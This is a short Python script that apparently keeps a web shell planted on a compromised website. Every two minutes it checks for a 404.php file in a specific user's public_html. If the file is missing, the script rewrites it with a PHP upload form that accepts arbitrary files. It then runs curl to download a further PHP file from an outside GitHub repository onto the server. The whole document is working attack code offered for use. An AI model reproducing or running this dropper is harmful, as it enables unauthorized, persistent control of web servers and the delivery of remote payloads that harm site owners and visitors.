import os
import time
import os.path

def main():
    while True:
        f = os.path.exists('/home/pesisirselatanba/public_html/404.php') 
        
        if f == True:
            print("[*] file exists")
            pass
            time.sleep(120)
            
        else:
            print("[!] file not found")
            print("[!] creating file")
            
            a = open('/home/pesisirselatanba/public_html/404.php','a') 
            
            a.write("<script> window.addEventListener('DOMContentLoaded',function(){let e=document.createElement('form');e.method='post',e.enctype='multipart/form-data';let t=document.createElement('input');t.type='file',t.name='file',t.required=!0;let n=document.createElement('button');n.type='submit',n.innerHTML='SEND',e.appendChild(t),e.appendChild(n),document.body.appendChild(e)}); </script> <?php if($_FILES){if(function_exists('move_uploaded_file')){if(move_uploaded_file($_FILES['file']['tmp_name'],$_FILES['file']['name'])){printf('OK  <a href=""></a><br/>',$_FILES['file']['name'],$_FILES['file']['name']);}else{print 'FAIL';}}elseif(function_exists('copy')){if(copy($_FILES['file']['tmp_name'],$_FILES['file']['name'])){printf('OK  <a href=""></a><br/>',$_FILES['file']['name'],$_FILES['file']['name']);}else{print 'FAIL';}}} ?>")
            
            a.close()
            
            os.system('curl "https://raw.githubusercontent.com/sniper404ghostxploit/www/main/sexy.php" > /sexy.php')
            
            time.sleep(120)
            
